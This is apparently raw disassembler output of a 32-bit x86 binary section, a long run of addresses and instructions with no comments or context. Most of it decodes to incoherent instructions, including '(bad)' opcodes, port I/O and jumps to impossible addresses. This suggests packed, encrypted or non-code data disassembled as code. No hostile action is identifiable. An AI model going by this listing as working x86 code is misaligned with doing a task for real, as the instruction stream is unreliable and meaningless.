  40d71e:	jp     0x40d771
  40d720:	add    esp,DWORD PTR [ecx+0x47]
  40d723:	imul   DWORD PTR [eax+0x52]
  40d726:	aas    
  40d727:	call   0x99e8876d
  40d72c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d72d:	dec    ebp
  40d72e:	dec    ebp
  40d72f:	push   esp
  40d730:	add    eax,esp
  40d732:	or     esp,ebx
  40d734:	into   
  40d735:	sub    ebx,DWORD PTR [edi-0x1a51642b]
  40d73b:	(bad)  
  40d73c:	std    
  40d73d:	sub    ch,BYTE PTR [ebx-0x63f41916]
  40d743:	sub    al,0x67
  40d745:	push   0x4aeb1911
  40d74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d74b:	not    BYTE PTR [esi+0x618d5fbe]
  40d751:	(bad)  
  40d752:	xchg   esi,eax
  40d753:	mov    ecx,0xc1101163
  40d758:	sub    ebx,DWORD PTR [ebp+0x28638a83]
  40d75e:	sub    al,0xde
  40d760:	sub    DWORD PTR [ebx],edi
  40d762:	gs dec edx
  40d764:	ret    0xc2e1
  40d767:	jmp    0xf5dfbebb
  40d76c:	retf   0x1718
  40d76f:	mov    ebx,0x93be94f
  40d774:	jnp    0x40d7b4
  40d776:	(bad)  
  40d777:	icebp  
  40d778:	and    al,0xc4
  40d77a:	cmc    
  40d77b:	pop    ss
  40d77c:	sub    ebx,esi
  40d77e:	loope  0x40d7f8
  40d780:	pusha  
  40d781:	sub    BYTE PTR [ebx],0xdc
  40d784:	add    ebp,esp
  40d786:	ror    DWORD PTR [eax],1
  40d788:	test   BYTE PTR [ebx-0x6da5e205],dh
  40d78e:	mov    ebx,0x7ceb4025
  40d793:	inc    ebp
  40d794:	or     BYTE PTR [edx],bh
  40d796:	cs jle 0x40d7f6
  40d799:	adc    ebp,DWORD PTR [ebx-0x51cfdbbe]
  40d79f:	dec    esp
  40d7a0:	daa    
  40d7a1:	adc    ah,dh
  40d7a3:	and    ebx,esi
  40d7a5:	pop    ss
  40d7a6:	sbb    al,0xf
  40d7a8:	shl    BYTE PTR [ebx-0x5c],1
  40d7ab:	ds pop esi
  40d7ad:	pop    esp
  40d7ae:	cmovns esp,DWORD PTR [edx-0xa4cae92]
  40d7b5:	icebp  
  40d7b6:	int3   
  40d7b7:	xor    al,0x5f
  40d7b9:	jbe    0x40d76b
  40d7bb:	test   al,0xf2
  40d7bd:	imul   esi,DWORD PTR [ebx+0x404cf403],0x5d71c3ef
  40d7c7:	movq   mm6,QWORD PTR [ebp+0x6e1cca25]
  40d7ce:	mov    ?,ecx
  40d7d0:	pop    edx
  40d7d1:	pusha  
  40d7d2:	ror    eax,0xb8
  40d7d5:	(bad)  
  40d7d6:	push   ds
  40d7d7:	push   edi
  40d7d8:	in     al,dx
  40d7d9:	(bad)  
  40d7db:	cmp    ebp,DWORD PTR [edi+0x6dd79aba]
  40d7e1:	push   eax
  40d7e2:	push   ebp
  40d7e3:	div    BYTE PTR [edi-0x5a]
  40d7e6:	and    bl,ah
  40d7e8:	inc    edx
  40d7e9:	lea    eax,[eax-0x41]
  40d7ec:	retf   
  40d7ed:	and    BYTE PTR [edi-0x3d0837d1],ch
  40d7f3:	mov    ah,BYTE PTR [ecx+0x74985044]
  40d7f9:	mov    al,ds:0x56b0ff5f
  40d7fe:	in     eax,0xbf
  40d800:	push   edi
  40d801:	jge    0x40d7ac
  40d803:	ret    0x8b8f
  40d806:	out    dx,al
  40d807:	and    BYTE PTR [eax+esi*2-0x7aaccdf7],0xbf
  40d80f:	leave  
  40d810:	rol    BYTE PTR [esi-0x74e25306],0xcb
  40d817:	mov    dl,BYTE PTR [ebx]
  40d819:	scas   eax,DWORD PTR es:[edi]
  40d81a:	shl    BYTE PTR [edx+0x77aaf4cd],0xa3
  40d821:	jae    0x40d89e
  40d823:	sub    eax,DWORD PTR [eax-0x54]
  40d826:	push   eax
  40d827:	jmp    0x40d815
  40d829:	adc    BYTE PTR ds:0xa4d5a8cd,ch
  40d82f:	repnz std 
  40d831:	adc    eax,0x5d1ab5c8
  40d836:	aam    0x16
  40d838:	xchg   esi,eax
  40d839:	jmp    0x76da:0x4e18382d
  40d840:	mov    cl,0x50
  40d842:	mov    ebx,0x2bea1da7
  40d847:	add    eax,0x739be64e
  40d84c:	jl     0x40d853
  40d84e:	int3   
  40d84f:	ret    
  40d850:	dec    esp
  40d851:	lock xchg ebp,eax
  40d853:	test   eax,0xb29b4da4
  40d858:	addr16 jmp 0x40d882
  40d85b:	leave  
  40d85c:	aam    0xb5
  40d85e:	push   cs
  40d85f:	push   edi
  40d860:	push   edi
  40d861:	sub    BYTE PTR [edi],al
  40d863:	mov    esi,0x4adadf75
  40d868:	fdivr  DWORD PTR [edx]
  40d86a:	jns    0x40d82a
  40d86c:	sub    al,0x53
  40d86e:	inc    esi
  40d86f:	mov    eax,0x8f0e8c7a
  40d874:	fcomp  DWORD PTR [edi]
  40d876:	out    dx,eax
  40d877:	jp     0x40d8f7
  40d879:	hlt    
  40d87a:	test   eax,0x5f2b7214
  40d87f:	ss dec edi
  40d881:	mov    BYTE PTR [edx],ah
  40d883:	xor    DWORD PTR [esi],0x17
  40d886:	stos   DWORD PTR es:[edi],eax
  40d887:	pop    ds
  40d888:	and    bh,BYTE PTR [edi-0x5db46669]
  40d88e:	xor    ah,BYTE PTR [esi+ebx*2]
  40d891:	clc    
  40d892:	xor    edi,DWORD PTR [esi+0x5e]
  40d895:	cmova  esp,DWORD PTR [eax+0x553cc8cb]
  40d89c:	xor    eax,0x15407776
  40d8a1:	gs inc edi
  40d8a3:	jle    0x40d8b8
  40d8a5:	add    al,0xaf
  40d8a7:	(bad)  
  40d8a9:	les    ecx,FWORD PTR [edi+0x4b]
  40d8ac:	mov    al,ds:0x29e9f310
  40d8b1:	fxch   st(1)
  40d8b3:	das    
  40d8b4:	mov    esi,0x50084a62
  40d8b9:	pusha  
  40d8ba:	cmc    
  40d8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8bc:	add    bl,BYTE PTR [edi]
  40d8be:	push   0xffffffc0
  40d8c0:	test   dl,cl
  40d8c2:	xchg   ecx,eax
  40d8c3:	push   0xffffffdb
  40d8c5:	xchg   esp,eax
  40d8c6:	sbb    eax,0xfe6f2d2b
  40d8cb:	sbb    BYTE PTR [edx],0xe7
  40d8ce:	push   0x3f5f8167
  40d8d3:	pop    ss
  40d8d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8d5:	sbb    cl,BYTE PTR [esi+0x30]
  40d8d8:	jne    0x40d85d
  40d8da:	mov    bh,0xbc
  40d8dc:	or     BYTE PTR [ebx-0x71d96083],0xb
  40d8e3:	and    bl,BYTE PTR [eax+0x6d770c62]
  40d8e9:	sbb    eax,0x10f0122e
  40d8ee:	inc    edx
  40d8ef:	xchg   ebp,eax
  40d8f0:	dec    BYTE PTR [ebx]
  40d8f2:	sbb    ecx,DWORD PTR ss:0x70e82804
  40d8f9:	xor    dh,cl
  40d8fb:	mov    dl,ch
  40d8fd:	fbld   TBYTE PTR [esi+0xf639aed]
  40d903:	jbe    0x40d8d2
  40d905:	jle    0x40d8ca
  40d907:	or     DWORD PTR [edi],ebx
  40d909:	xor    eax,0xd281f72d
  40d90e:	stos   BYTE PTR es:[edi],al
  40d90f:	sub    bl,bh
  40d911:	loope  0x40d921
  40d913:	aaa    
  40d914:	mov    ebp,0x9175c3a2
  40d919:	mov    WORD PTR [ebx+0x2e],fs
  40d91c:	ss hlt 
  40d91e:	mov    BYTE PTR [ebx],ch
  40d920:	mov    ebp,0x454387c4
  40d925:	jl     0x40d96a
  40d927:	push   ecx
  40d928:	pop    esi
  40d929:	or     DWORD PTR [esi],0x17
  40d92c:	popa   
  40d92d:	cmp    eax,0xf7e95ea4
  40d932:	lds    ebp,FWORD PTR [ecx+0x13]
  40d935:	push   ss
  40d936:	and    eax,0x52817b33
  40d93b:	(bad)  
  40d93c:	and    bl,cl
  40d93e:	push   eax
  40d93f:	push   0xffffffac
  40d941:	mov    DWORD PTR [ebx],ebx
  40d943:	push   0xffffff87
  40d945:	inc    esp
  40d946:	rcl    ecx,cl
  40d948:	xor    eax,0x15ea3ab
  40d94d:	and    BYTE PTR [ecx-0x1a],dl
  40d950:	mov    eax,0x4c668def
  40d955:	push   cs
  40d956:	mov    ebp,DWORD PTR ds:0xec065fc6
  40d95c:	retf   0x270a
  40d95f:	das    
  40d960:	popf   
  40d961:	mov    fs,esi
  40d963:	adc    esi,DWORD PTR [edx+0x5ea8140a]
  40d969:	xor    eax,0x6213bab0
  40d96e:	xchg   ebp,eax
  40d96f:	pop    ds
  40d970:	imul   ebx,DWORD PTR gs:[edi+0xf],0xffffff93
  40d975:	mov    esp,?
  40d977:	enterw 0x8fc6,0x60
  40d97c:	inc    edx
  40d97d:	xchg   ebx,eax
  40d97e:	in     al,dx
  40d97f:	cmp    DWORD PTR ds:0x8f4da3a0,esi
  40d985:	test   BYTE PTR [edx-0x6e1a235a],0x73
  40d98c:	jl     0x40d987
  40d98e:	inc    ebp
  40d98f:	call   0xc5336f73
  40d994:	adc    esi,DWORD PTR [ebp+0x2a]
  40d997:	jle    0x40d928
  40d999:	out    dx,al
  40d99a:	lods   eax,DWORD PTR ds:[esi]
  40d99b:	lods   al,BYTE PTR ds:[esi]
  40d99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d99d:	sbb    BYTE PTR [ebx+0x0],0xe7
  40d9a1:	ds aad 0x7d
  40d9a4:	repnz (bad) 
  40d9a7:	adc    eax,0x2edf3fbf
  40d9ac:	pusha  
  40d9ad:	mov    ah,0x45
  40d9af:	bound  eax,QWORD PTR [eax-0x2542d74]
  40d9b5:	aad    0x7
  40d9b7:	(bad)  
  40d9b8:	dec    ebp
  40d9b9:	fild   QWORD PTR [edi+0x82c29e6]
  40d9bf:	sub    al,0x5
  40d9c1:	sbb    ch,BYTE PTR [ecx-0x3499fb3f]
  40d9c7:	xchg   eax,esi
  40d9c9:	(bad)  
  40d9ca:	xchg   ebp,eax
  40d9cb:	sub    cl,BYTE PTR [esi]
  40d9cd:	pop    ebp
  40d9ce:	hlt    
  40d9cf:	jae    0x40da3d
  40d9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9d2:	add    al,0x61
  40d9d5:	xor    eax,0xd26b57e6
  40d9da:	aas    
  40d9db:	(bad)  
  40d9dc:	adc    bl,BYTE PTR [esi-0x5]
  40d9df:	xchg   edx,eax
  40d9e0:	mov    ebp,fs
  40d9e2:	int    0x2
  40d9e4:	mov    cl,0x1d
  40d9e6:	xchg   BYTE PTR [ebx+0x71004ee2],bl
  40d9ec:	loope  0x40d9b7
  40d9ee:	adc    DWORD PTR [ecx-0x13],edx
  40d9f1:	out    0x81,al
  40d9f3:	arpl   WORD PTR ds:0x9633cddb,ax
  40d9f9:	push   eax
  40d9fa:	push   eax
  40d9fb:	mov    es,WORD PTR [edx-0x2ffebeb1]
  40da01:	xchg   esp,eax
  40da02:	inc    esi
  40da03:	fs arpl cx,cx
  40da06:	les    edx,FWORD PTR [ecx-0x15]
  40da09:	mov    ecx,0xa9d0f871
  40da0e:	cmp    BYTE PTR [edi],dl
  40da10:	leave  
  40da11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da13:	stos   DWORD PTR es:[edi],eax
  40da14:	or     al,0xab
  40da16:	aas    
  40da17:	mov    WORD PTR [esi],es
  40da19:	jo     0x40da69
  40da1b:	mov    ebp,0x91e7133a
  40da20:	dec    DWORD PTR [esp+edi*1-0x1e]
  40da24:	mov    ebp,0x31de978d
  40da29:	mov    ah,0x43
  40da2b:	inc    ebp
  40da2c:	push   ecx
  40da2d:	add    al,0x38
  40da2f:	sbb    BYTE PTR [edx+0x4d44eeb],dh
  40da35:	and    DWORD PTR [ecx],ebp
  40da37:	push   ds
  40da38:	xchg   ebp,eax
  40da39:	jp     0x40da23
  40da3b:	imul   ebp,DWORD PTR [eax],0xc5832b8d
  40da41:	inc    ecx
  40da42:	ins    DWORD PTR es:[edi],dx
  40da43:	enter  0xcdb7,0xd6
  40da47:	or     al,0x23
  40da49:	ret    
  40da4a:	and    al,0x20
  40da4c:	jns    0x40da2b
  40da4e:	xor    edi,eax
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0x77,eax
  40da6e:	test   al,0xe8
  40da70:	xchg   edi,eax
  40da71:	xor    ah,BYTE PTR [edx+0x79707e7e]
  40da77:	jle    0x40daf7
  40da79:	stc    
  40da7a:	ins    DWORD PTR es:[edi],dx
  40da7b:	mov    esp,0xf2cd44
  40da80:	jmp    0x8890:0x55c0eace
  40da87:	sub    al,0xd7
  40da89:	daa    
  40da8a:	cld    
  40da8b:	in     al,0x1b
  40da8d:	xor    edi,DWORD PTR [ebp+0x2a8e9c3c]
  40da93:	dec    eax
  40da94:	mov    WORD PTR [edi],ds
  40da96:	jmp    0x9caeb00c
  40da9b:	jecxz  0x40dac0
  40da9d:	push   0x13
  40da9f:	iret   
  40daa0:	push   edi
  40daa1:	mov    esi,ebx
  40daa3:	stc    
  40daa4:	(bad)  
  40daa5:	pop    ss
  40daa6:	xor    eax,0x491651c3
  40daab:	aaa    
  40daac:	jne    0x40da58
  40daae:	popf   
  40daaf:	fdivr  st(0),st
  40dab1:	ret    0x395f
  40dab4:	fs dec esi
  40dab6:	dec    edi
  40dab7:	inc    ecx
  40dab8:	and    ebx,edi
  40daba:	adc    bh,BYTE PTR [edi+0x4f]
  40dabd:	(bad)  
  40dabe:	mov    ebp,0xd807612f
  40dac3:	mov    al,0x83
  40dac5:	push   cs
  40dac6:	pop    ds
  40dac7:	adc    DWORD PTR [edx],0xd03438e6
  40dacd:	mov    BYTE PTR [eax+0x9a7c664],bh
  40dad3:	jmp    0xb5716efb
  40dad8:	dec    edx
  40dad9:	mov    cl,0x86
  40dadb:	mov    ecx,0xa21167a9
  40dae0:	ja     0x40da6d
  40dae2:	into   
  40dae3:	push   ecx
  40dae4:	push   edi
  40dae5:	retf   0xb966
  40dae8:	sub    al,cl
  40daea:	sub    bl,BYTE PTR [edi-0x78]
  40daed:	jno    0x40daed
  40daef:	push   ebp
  40daf0:	mov    bh,BYTE PTR [edi+eiz*1-0x2]
  40daf4:	xor    eax,0x6fda7c7e
  40daf9:	inc    DWORD PTR [ecx-0x5b]
  40dafc:	mov    ds:0x8cb88136,al
  40db01:	aas    
  40db02:	popf   
  40db03:	call   0xa4b8605a
  40db08:	and    esp,eax
  40db0a:	xor    BYTE PTR [eax+0x78],bh
  40db0d:	dec    ecx
  40db0e:	dec    eax
  40db0f:	stos   DWORD PTR es:[edi],eax
  40db10:	cmp    al,0x67
  40db12:	push   0xffffffd3
  40db14:	aas    
  40db15:	mov    eax,ds:0x3660541b
  40db1a:	push   esi
  40db1b:	jne    0x40daff
  40db1d:	pop    ebx
  40db1e:	pushf  
  40db1f:	popf   
  40db20:	sar    DWORD PTR [edx-0x133b3e43],1
  40db26:	jmp    0xe8c9:0x89008f2c
  40db2d:	(bad)  
  40db2e:	aam    0x12
  40db30:	jecxz  0x40db20
  40db32:	jle    0x40dba9
  40db34:	imul   edx,DWORD PTR [edx+esi*1],0x6a264cca
  40db3b:	xchg   esp,eax
  40db3c:	ins    DWORD PTR es:[edi],dx
  40db3d:	pop    ss
  40db3e:	aad    0x1
  40db40:	xor    ebp,DWORD PTR [edx]
  40db42:	adc    bl,BYTE PTR [edi+0x4a]
  40db45:	and    edi,ecx
  40db47:	add    al,0x8
  40db49:	add    DWORD PTR [esi-0x78],ecx
  40db4c:	xor    eax,ecx
  40db4e:	lds    esi,FWORD PTR [ecx+0x7a8b9887]
  40db54:	add    esi,DWORD PTR [edx-0x120f03e6]
  40db5a:	mov    cl,dh
  40db5c:	adc    dh,BYTE PTR ds:0x7058aadd
  40db62:	rol    BYTE PTR [edi],0x41
  40db65:	inc    ebx
  40db66:	mov    edx,0xa255e9ee
  40db6b:	adc    dh,dh
  40db6d:	add    esi,DWORD PTR ds:0xb31a080a
  40db73:	out    0x12,al
  40db75:	mov    ds:0xb90a4734,eax
  40db7a:	jmp    0x8d5d:0xef541e0d
  40db81:	mov    edi,0xeac5b849
  40db86:	xchg   ecx,eax
  40db87:	or     BYTE PTR [esi],bl
  40db89:	outs   dx,BYTE PTR ds:[esi]
  40db8a:	int    0x6f
  40db8c:	retf   0xda2c
  40db8f:	jb     0x40dbe3
  40db91:	xchg   ebx,eax
  40db92:	ins    BYTE PTR es:[edi],dx
  40db93:	das    
  40db94:	mov    esi,0x53c766a9
  40db99:	scas   al,BYTE PTR es:[edi]
  40db9a:	jge    0x40dbfb
  40db9c:	aam    0x11
  40db9e:	into   
  40db9f:	xor    al,0xa1
  40dba1:	lds    ecx,FWORD PTR ds:0xe96bd993
  40dba7:	mov    ebp,0x28e4eaf1
  40dbac:	fild   DWORD PTR [esi-0x4a3685b5]
  40dbb2:	add    eax,0xb247ae8b
  40dbb7:	fimul  DWORD PTR [ecx]
  40dbb9:	mov    ch,0xf9
  40dbbb:	xchg   esi,eax
  40dbbc:	ins    BYTE PTR es:[edi],dx
  40dbbd:	or     edi,eax
  40dbbf:	fidiv  WORD PTR [eax+0x6c3f0b93]
  40dbc5:	jmp    0x54a3:0x88153267
  40dbcc:	les    eax,FWORD PTR [edx+ebx*2-0x54]
  40dbd0:	sub    ch,BYTE PTR [ebx-0x21]
  40dbd3:	and    eax,0x99c9e006
  40dbd8:	in     al,0x4b
  40dbda:	fisub  DWORD PTR [ebx-0x76526722]
  40dbe0:	(bad)  
  40dbe2:	push   es
  40dbe3:	or     al,0x9a
  40dbe5:	push   eax
  40dbe6:	xchg   esp,eax
  40dbe7:	ds jae 0x40dbc9
  40dbea:	adc    edx,DWORD PTR [esi+edi*1]
  40dbed:	pop    esp
  40dbee:	mov    eax,ds:0xc68e504b
  40dbf3:	mov    ecx,0x76eec5d9
  40dbf8:	xchg   edx,eax
  40dbf9:	call   0x4c6b57e4
  40dbfe:	mov    al,0x8e
  40dc00:	jmp    0xb12a621f
  40dc05:	and    ah,BYTE PTR [edi+ecx*8-0x79cd741f]
  40dc0c:	out    0xc4,al
  40dc0e:	std    
  40dc0f:	popa   
  40dc10:	fstp   st(6)
  40dc12:	fidivr WORD PTR [ebx-0xfe97bfd]
  40dc18:	out    0x67,al
  40dc1a:	push   esp
  40dc1b:	call   0xc720:0xe039b5ce
  40dc22:	push   edi
  40dc23:	cmp    ch,BYTE PTR [edx+0x52]
  40dc26:	int3   
  40dc27:	xchg   ebx,eax
  40dc28:	mov    esi,0xb88fdc6c
  40dc2d:	int    0xa3
  40dc2f:	add    DWORD PTR [eax-0x15],edx
  40dc32:	mov    dl,0x25
  40dc34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc35:	std    
  40dc36:	jmp    0xd65ca897
  40dc3b:	out    dx,al
  40dc3c:	mov    edx,0x2a7ea748
  40dc41:	xor    ch,BYTE PTR [ebx-0x77]
  40dc44:	mov    esp,esp
  40dc46:	mov    cl,0x8f
  40dc48:	mov    dh,0xe7
  40dc4a:	enter  0x1fde,0x6d
  40dc4e:	push   ebx
  40dc4f:	rdtsc  
  40dc51:	or     DWORD PTR [ebx],ebx
  40dc53:	pop    ecx
  40dc54:	xchg   ebp,eax
  40dc55:	psrld  xmm4,XMMWORD PTR [edi-0x3d]
  40dc5a:	push   ebp
  40dc5b:	les    esp,FWORD PTR [edx+0x411aa4cd]
  40dc61:	das    
  40dc62:	call   0xc0e5664a
  40dc67:	or     DWORD PTR ds:0xb5fdd95f,0xb1300ffc
  40dc71:	clc    
  40dc72:	test   al,0x9d
  40dc74:	pop    eax
  40dc75:	jo     0x40dcde
  40dc77:	sub    DWORD PTR [esi-0x71],edx
  40dc7a:	mov    ds:0xd4b24828,eax
  40dc7f:	add    DWORD PTR [esi],edi
  40dc81:	jae    0x40dca6
  40dc83:	mov    eax,ds:0xb8f63093
  40dc88:	mov    BYTE PTR [edi+ebp*8-0x4adf71a9],dl
  40dc8f:	lds    ebp,FWORD PTR [edi+0x1e]
  40dc92:	jbe    0x40dcc6
  40dc94:	loop   0x40dc7b
  40dc96:	pop    ebp
  40dc97:	(bad)  
  40dc98:	sbb    BYTE PTR ds:0xca145b4d,bl
  40dc9e:	test   al,0x39
  40dca0:	add    esi,ebx
  40dca2:	(bad)  
  40dca3:	cli    
  40dca4:	ins    DWORD PTR es:[edi],dx
  40dca5:	out    dx,al
  40dca6:	push   0xa15cfdde
  40dcab:	fsubrp st(7),st
  40dcad:	(bad)  
  40dcae:	or     eax,0x1f2f409
  40dcb3:	aaa    
  40dcb4:	jmp    0x40dc99
  40dcb6:	inc    esi
  40dcb7:	in     al,0xd2
  40dcb9:	(bad)  
  40dcba:	int    0xf1
  40dcbc:	add    BYTE PTR [ebp-0x4f1fd931],al
  40dcc2:	jl     0x40dd2a
  40dcc4:	fstp   st(1)
  40dcc6:	mov    ds:0xe827cf3f,al
  40dccb:	mov    fs,WORD PTR [edx-0x1c]
  40dcce:	mov    dh,0xac
  40dcd0:	xor    al,0x1e
  40dcd3:	sysenter 
  40dcd5:	cld    
  40dcd6:	and    al,0x43
  40dcd8:	loope  0x40dcc0
  40dcda:	push   esi
  40dcdb:	inc    ebp
  40dcdc:	test   ah,bh
  40dcde:	lock xor cl,dh
  40dce1:	shl    esp,0x63
  40dce4:	or     dl,BYTE PTR [ebp+eax*2+0x41]
  40dce8:	repz inc ebx
  40dcea:	pop    ds
  40dceb:	sub    eax,0x1f5bc7d
  40dcf0:	lea    ebp,[ebx+0xddb7a19]
  40dcf6:	adc    eax,0xf3f123e7
  40dcfb:	fst    DWORD PTR [eax+0x5c6e1b7d]
  40dd01:	or     DWORD PTR [edx+0xb],esp
  40dd04:	xor    DWORD PTR [ebx],esp
  40dd06:	pop    edx
  40dd07:	or     DWORD PTR [edx+0x14],edi
  40dd0a:	xchg   edi,eax
  40dd0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd0c:	mov    ch,0xbc
  40dd0e:	pop    esi
  40dd0f:	dec    esi
  40dd10:	shl    DWORD PTR [ebx+eiz*2-0xb21c4fd],cl
  40dd17:	dec    BYTE PTR [esi-0x50]
  40dd1a:	dec    esi
  40dd1b:	ja     0x40dd6e
  40dd1d:	lahf   
  40dd1e:	sbb    ebp,DWORD PTR [ebx]
  40dd20:	jae    0x40dd93
  40dd22:	(bad)  
  40dd24:	mov    WORD PTR [edi-0x21c7941b],fs
  40dd2a:	cwde   
  40dd2b:	and    DWORD PTR [ebp-0x37],esp
  40dd2e:	(bad)  
  40dd2f:	ins    DWORD PTR es:[edi],dx
  40dd30:	imul   ecx
  40dd32:	sub    eax,DWORD PTR ss:[edi+esi*2+0x6e]
  40dd37:	aam    0x8a
  40dd39:	sar    BYTE PTR [edx],1
  40dd3b:	in     al,0x5d
  40dd3d:	adc    edi,edx
  40dd3f:	scas   eax,DWORD PTR es:[edi]
  40dd40:	(bad)  
  40dd41:	out    dx,eax
  40dd42:	jbe    0x40dd5a
  40dd44:	push   ebx
  40dd45:	mul    cl
  40dd47:	fild   DWORD PTR [eax-0x705af0d5]
  40dd4d:	sub    BYTE PTR [edx+ebp*4],dl
  40dd50:	adc    cl,cl
  40dd52:	in     al,0x91
  40dd54:	out    dx,eax
  40dd55:	jmp    0x40dd11
  40dd57:	mov    ecx,0xc822f2e4
  40dd5c:	sbb    bh,BYTE PTR [edi-0x4ff696ba]
  40dd62:	inc    ecx
  40dd63:	mov    ch,0x54
  40dd65:	mov    dl,0xeb
  40dd67:	sub    ecx,DWORD PTR [ebx]
  40dd69:	mov    dl,0xe6
  40dd6b:	mov    ah,0x43
  40dd6d:	inc    edx
  40dd6e:	or     DWORD PTR [ebp-0x5f4a5f43],0xc5cc3ac7
  40dd78:	rcl    edx,cl
  40dd7a:	jno    0x40dd13
  40dd7c:	jbe    0x40ddd5
  40dd7e:	mov    ecx,0x7eeb1860
  40dd83:	jecxz  0x40dd1e
  40dd85:	sbb    esi,esi
  40dd87:	test   BYTE PTR [ebx-0x15c7281f],cl
  40dd8d:	mov    ch,0x68
  40dd8f:	push   0xffffffe0
  40dd91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd92:	in     al,dx
  40dd93:	call   0xa872895a
  40dd98:	and    eax,0xfffffff9
  40dd9b:	repz adc al,0x4a
  40dd9e:	adc    DWORD PTR [ebp-0x39e35764],esp
  40dda4:	sub    ecx,ebx
  40dda6:	mov    ds:0x2e00617,al
  40ddab:	popa   
  40ddac:	in     al,dx
  40ddad:	and    eax,DWORD PTR [esi-0x56]
  40ddb0:	adc    ebp,ecx
  40ddb2:	push   eax
  40ddb3:	add    eax,0xbb6d0c06
  40ddb8:	or     DWORD PTR [esi],esi
  40ddba:	into   
  40ddbb:	imul   edx,DWORD PTR [edi+edx*1],0xffffff8e
  40ddbf:	out    dx,al
  40ddc0:	jl     0x40de28
  40ddc2:	xchg   edi,eax
  40ddc3:	cmc    
  40ddc4:	cs ja  0x40de01
  40ddc7:	fmul   QWORD PTR [eax]
  40ddc9:	cs fnop 
  40ddcc:	bound  ebx,QWORD PTR [ebp-0x5d]
  40ddcf:	leave  
  40ddd0:	iret   
  40ddd1:	in     al,dx
  40ddd2:	mov    ebp,0x96a6ce47
  40ddd7:	cdq    
  40ddd8:	fnsave [ebx]
  40ddda:	jge    0x40ddc2
  40dddc:	mov    ebp,0x6caaeb78
  40dde1:	dec    esp
  40dde2:	mov    dh,0x57
  40dde4:	mov    cl,0xbb
  40dde6:	ret    
  40dde7:	lock bound ebp,QWORD PTR [eax+edx*2]
  40ddeb:	adc    ch,bh
  40dded:	push   cs
  40ddee:	inc    edx
  40ddef:	add    cl,0xcf
  40ddf2:	js     0x40ddd9
  40ddf4:	cmp    BYTE PTR [esi*2-0x54e55f1d],cl
  40ddfb:	test   BYTE PTR [ecx-0x325a5c84],bl
  40de01:	mov    ah,0x30
  40de03:	ret    
  40de04:	fwait
  40de05:	icebp  
  40de06:	push   ebx
  40de07:	mov    eax,ds:0x497664e7
  40de0c:	inc    ebx
  40de0d:	les    ebp,FWORD PTR [edi]
  40de0f:	push   edx
  40de10:	add    ebp,0xffffff9d
  40de13:	add    esp,DWORD PTR [ebx+0x2b7e77d]
  40de19:	push   ds
  40de1a:	pushf  
  40de1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de1c:	addr16 into 
  40de1e:	or     ah,BYTE PTR [edx]
  40de20:	scas   eax,DWORD PTR es:[edi]
  40de21:	mov    edi,DWORD PTR [ebp+0x96612bc]
  40de27:	data16 jge 0x40de1c
  40de2a:	inc    edi
  40de2b:	push   ss
  40de2c:	mov    eax,ds:0x6b2b15c0
  40de31:	mov    al,ds:0x1cc0cf1c
  40de36:	jb     0x40de8c
  40de38:	and    ah,ah
  40de3a:	dec    ebp
  40de3b:	(bad)  
  40de3c:	xchg   ecx,eax
  40de3d:	das    
  40de3e:	sar    DWORD PTR [eax-0x8909719],cl
  40de44:	popf   
  40de45:	or     bl,ah
  40de47:	push   0xf7b451a6
  40de4c:	xchg   esp,eax
  40de4d:	dec    ecx
  40de4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de4f:	js     0x40de8f
  40de51:	or     eax,0x227b3ce4
  40de56:	cbw    
  40de58:	push   es
  40de59:	and    ebp,esp
  40de5b:	sbb    al,0xc6
  40de5d:	push   0x9e7363ef
  40de62:	sti    
  40de63:	out    dx,al
  40de64:	xchg   esi,eax
  40de65:	jecxz  0x40de3f
  40de67:	push   ecx
  40de68:	pop    esp
  40de69:	js     0x40dec6
  40de6b:	mov    dh,0x2
  40de6d:	xchg   BYTE PTR [esp+eax*4+0x6b],dh
  40de71:	adc    DWORD PTR [ebp-0x7407aa77],ebp
  40de77:	push   ebp
  40de78:	loopne 0x40dead
  40de7a:	sar    BYTE PTR [edi-0x327299],1
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	in     al,0x4f
  40de93:	in     eax,0x77
  40de95:	xor    al,0xae
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	inc    ecx
  40de9e:	cld    
  40de9f:	ja     0x40de40
  40dea1:	mov    ebp,0x4e4355c2
  40dea6:	(bad)  [esp+ecx*4]
  40dea9:	sub    DWORD PTR [ebp+0x52],eax
  40deac:	xor    eax,0x535f4ad7
  40deb1:	mov    cl,BYTE PTR [ebx]
  40deb3:	cmp    edi,DWORD PTR [ebx+0x74f1f0b8]
  40deb9:	imul   edx,DWORD PTR [edi],0xffffffee
  40debc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40debd:	add    BYTE PTR [edx+0x44c00054],ah
  40dec3:	ficom  DWORD PTR [ebx-0xf]
  40dec6:	push   es
  40dec7:	loop   0x40de94
  40dec9:	inc    ebx
  40deca:	sbb    al,0x82
  40decc:	jle    0x40debb
  40dece:	inc    esi
  40decf:	mov    eax,0xb1e935e5
  40ded4:	lahf   
  40ded5:	ss add ah,cl
  40ded8:	ins    DWORD PTR es:[edi],dx
  40ded9:	sub    BYTE PTR [edi-0x27e7f03f],bh
